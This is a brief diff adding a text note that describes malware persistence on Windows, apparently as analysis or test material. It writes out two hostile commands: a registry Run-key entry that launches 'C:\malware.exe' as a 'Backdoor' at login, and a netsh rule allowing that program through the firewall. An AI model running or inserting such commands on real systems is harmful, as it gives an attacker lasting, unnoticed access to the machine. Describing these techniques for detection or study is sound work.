@@ -1,0 +1,9 @@
+This file contains code that creates a backdoor and persists in the system.
+
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\malware.exe"
+
+The malware also attempts to modify firewall rules:
+netsh firewall add allowedprogram C:\malware.exe ENABLE
+
+This creates persistence and network access for the attacker.
+
